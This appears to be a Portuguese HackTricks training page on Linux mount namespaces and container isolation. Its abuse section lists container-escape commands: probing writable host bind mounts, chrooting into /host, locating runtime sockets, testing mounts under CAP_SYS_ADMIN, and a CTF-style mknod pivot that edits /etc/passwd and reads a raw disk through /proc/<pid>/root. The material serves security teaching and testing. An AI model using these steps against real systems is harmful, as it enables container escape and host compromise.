# Namespace de Montagem

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão Geral

O namespace de montagem controla a **tabela de montagem** que um processo vê. Esta é uma das funcionalidades de isolamento de container mais importantes porque o sistema de arquivos raiz, bind mounts, tmpfs mounts, visão do procfs, exposição do sysfs e muitas montagens auxiliares específicas do runtime são todas expressas através dessa tabela de montagem. Dois processos podem ambos acessar `/`, `/proc`, `/sys`, ou `/tmp`, mas o que esses caminhos resolvem depende do namespace de montagem em que estão.

Do ponto de vista de segurança de containers, o namespace de montagem frequentemente faz a diferença entre "este é um sistema de arquivos de aplicação cuidadosamente preparado" e "este processo pode ver ou influenciar diretamente o sistema de arquivos do host". É por isso que bind mounts, `hostPath` volumes, operações de montagem privilegiadas, e exposições graváveis de `/proc` ou `/sys` giram em torno desse namespace.

## Operação

Quando um runtime lança um container, normalmente cria um novo namespace de montagem, prepara um sistema de arquivos raiz para o container, monta procfs e outros sistemas de arquivos auxiliares conforme necessário, e então opcionalmente adiciona bind mounts, tmpfs mounts, secrets, config maps, ou host paths. Uma vez que esse processo está rodando dentro do namespace, o conjunto de montagens que ele vê fica amplamente desacoplado da visão padrão do host. O host pode ainda ver o filesystem subjacente real, mas o container vê a versão montada para ele pelo runtime.

Isso é poderoso porque permite que o container acredite ter seu próprio sistema de arquivos raiz mesmo que o host continue gerenciando tudo. Também é perigoso porque se o runtime expuser a montagem errada, o processo de repente ganha visibilidade sobre recursos do host que o restante do modelo de segurança pode não ter sido projetado para proteger.

## Laboratório

Você pode criar um namespace de montagem privado com:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Se você abrir outro shell fora desse namespace e inspecionar a tabela de montagem, verá que a montagem tmpfs existe apenas dentro do namespace de montagem isolado. Este é um exercício útil porque mostra que o isolamento de montagem não é teoria abstrata; o kernel está literalmente apresentando uma tabela de montagem diferente ao processo.

Se você abrir outro shell fora desse namespace e inspecionar a tabela de montagem, a montagem tmpfs existirá apenas dentro do namespace de montagem isolado.

Dentro de containers, uma comparação rápida é:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
O segundo exemplo demonstra como é fácil para uma configuração de runtime abrir um grande buraco na fronteira do sistema de arquivos.

## Runtime Usage

Docker, Podman, stacks baseadas em containerd e CRI-O dependem todos de um mount namespace privado para containers normais. Kubernetes se apoia no mesmo mecanismo para volumes, projected secrets, config maps e montagens `hostPath`. Ambientes Incus/LXC também dependem fortemente de mount namespaces, especialmente porque system containers frequentemente expõem sistemas de arquivos mais ricos e mais parecidos com máquinas do que application containers.

Isso significa que ao revisar um problema no sistema de arquivos de um container, normalmente você não está olhando para uma peculiaridade isolada do Docker. Você está olhando para um problema de mount-namespace e configuração de runtime expresso através da plataforma que iniciou a carga de trabalho.

## Misconfigurations

O erro mais óbvio e perigoso é expor o filesystem root do host ou outro caminho sensível do host através de um bind mount, por exemplo `-v /:/host` ou um `hostPath` gravável em Kubernetes. Nesse ponto, a questão deixa de ser "o container pode de alguma forma escapar?" e passa a ser "quanto conteúdo útil do host já está diretamente visível e gravável?" Um host bind mount gravável frequentemente transforma o restante do exploit em uma simples questão de posicionamento de arquivos, chrooting, modificação de config ou descoberta de sockets do runtime.

Outro problema comum é expor `/proc` ou `/sys` do host de formas que contornem a visão mais segura do container. Esses filesystems não são montagens de dados ordinárias; eles são interfaces para o estado do kernel e dos processos. Se a carga de trabalho alcança as versões do host diretamente, muitas das suposições por trás do hardening de containers deixam de se aplicar de forma limpa.

Proteções read-only também importam. Um root filesystem read-only não garante magicamente a segurança de um container, mas remove uma grande quantidade de espaço de preparação para o atacante e torna persistência, colocação de helper-binaries e adulteração de config mais difíceis. Por outro lado, um root gravável ou um host bind mount gravável dá ao atacante espaço para preparar o próximo passo.

## Abuse

Quando o mount namespace é mal utilizado, atacantes comumente fazem uma de quatro coisas. Eles **leem dados do host** que deveriam permanecer fora do container. Eles **modificam a configuração do host** através de bind mounts graváveis. Eles **mountam ou remountam recursos adicionais** se capabilities e seccomp permitirem. Ou eles **acessam sockets poderosos e diretórios de estado do runtime** que permitem solicitar à própria plataforma de containers mais acesso.

Se o container já consegue ver o filesystem do host, o restante do modelo de segurança muda imediatamente.

Quando suspeitar de um host bind mount, confirme primeiro o que está disponível e se está writable:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Se o sistema de arquivos raiz do host estiver montado como leitura-escrita, o acesso direto ao host costuma ser tão simples quanto:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Se o objetivo for acesso privilegiado em tempo de execução em vez de chroot direto, enumere sockets e o estado de execução:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Se `CAP_SYS_ADMIN` estiver presente, teste também se novos mounts podem ser criados de dentro do container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Exemplo completo: Two-Shell `mknod` Pivot

Um caminho de abuso mais especializado surge quando o usuário root do container pode criar dispositivos de bloco, o host e o container compartilham uma identidade de usuário de forma útil, e o atacante já tem um acesso de baixo privilégio no host. Nessa situação, o container pode criar um nó de dispositivo como `/dev/sda`, e o usuário do host com baixo privilégio pode depois lê-lo através de `/proc/<pid>/root/` do processo correspondente do container.

Dentro do container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
No host, como o usuário correspondente com privilégios limitados após localizar o PID do shell do container:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
A lição importante não é a busca exata pela string do CTF. O ponto é que a exposição da mount-namespace através de `/proc/<pid>/root/` pode permitir que um usuário do host reutilize device nodes criados pelo container, mesmo quando a política de dispositivos do cgroup impedia o uso direto dentro do próprio container.

## Checks

Estes comandos existem para mostrar a vista do filesystem em que o processo atual realmente está. O objetivo é identificar mounts provenientes do host, caminhos sensíveis graváveis e qualquer coisa que pareça mais ampla do que um normal application container root filesystem.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
O que é interessante aqui:

- Bind mounts do host, especialmente `/`, `/proc`, `/sys`, diretórios de estado de runtime, ou locais de sockets, devem sobressair imediatamente.
- Mounts inesperados em read-write geralmente são mais importantes do que um grande número de mounts auxiliares em read-only.
- `mountinfo` costuma ser o melhor lugar para ver se um caminho é realmente derivado do host ou baseado em overlay.

Essas verificações estabelecem **quais recursos são visíveis neste namespace**, **quais são derivados do host**, e **quais deles são graváveis ou sensíveis à segurança**.
{{#include ../../../../../banners/hacktricks-training.md}}
